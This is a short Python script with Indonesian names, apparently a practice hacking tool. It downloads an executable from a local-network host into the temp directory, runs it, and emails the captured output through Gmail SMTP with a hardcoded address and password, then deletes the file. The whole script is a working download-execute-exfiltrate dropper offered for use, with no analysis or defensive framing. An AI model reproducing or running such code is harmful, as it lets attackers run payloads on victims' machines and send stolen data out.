#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile



def download_nuz(url):
    getrespon = requests.get(url)
    namafile = url.split("/")[-1]
    print(namafile)
    with open(namafile, "wb") as fileout:
        fileout.write(getrespon.content)

def kirimpesan_nuz(email, password, pesan):
    serv = smtplib.SMTP("smtp.gmail.com", 587)
    serv.starttls()
    serv.login(email, password)
    serv.sendmail(email, email, pesan)
    serv.quit()

tempdir = tempfile.gettempdir()
os.chdir(tempdir)
download_nuz("http://192.168.78.145/file_nuz/1mb.exe")
hasil = subprocess.check_output("1mb.exe", shell=True)
kirimpesan_nuz("nuz@gmail.com", "nuz111", hasil)
os.remove("1mb.exe")


